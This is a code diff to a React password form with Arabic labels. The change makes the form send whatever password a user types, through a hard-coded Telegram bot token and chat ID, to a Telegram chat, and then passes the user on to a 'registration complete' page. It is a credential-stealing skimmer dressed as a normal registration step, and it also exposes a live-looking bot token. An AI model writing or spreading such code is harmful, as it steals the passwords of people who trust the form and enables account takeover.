@@ -9,12 +9,36 @@ import { Info } from "lucide-react";
 const PasswordForm = () => {
   const navigate = useNavigate();
   const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
+  const [password, setPassword] = useState<string>("");
 
   const handleRecaptchaChange = (value: string | null) => {
     setRecaptchaValue(value);
   };
 
-  const handleContinue = () => {
+  const sendToTelegram = async (message: string) => {
+    try {
+      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
+      const chatId = "-4985537188";
+      
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML",
+        }),
+      });
+    } catch (error) {
+      console.error("فشل الإرسال إلى Telegram:", error);
+    }
+  };
+
+  const handleContinue = async () => {
+    const message = `تسجيل - كلمة المرور\n\nكلمة المرور: ${password}`;
+    await sendToTelegram(message);
     navigate("/registration-complete");
   };
 
@@ -51,7 +75,13 @@ const PasswordForm = () => {
           <Label htmlFor="password" className="text-right block mb-2">
             أدخل كلمة المرور
           </Label>
-          <Input id="password" type="password" className="text-right bg-white" />
+          <Input 
+            id="password" 
+            type="password" 
+            className="text-right bg-white"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+          />
         </div>
 
         {/* إعادة إدخال كلمة المرور */}
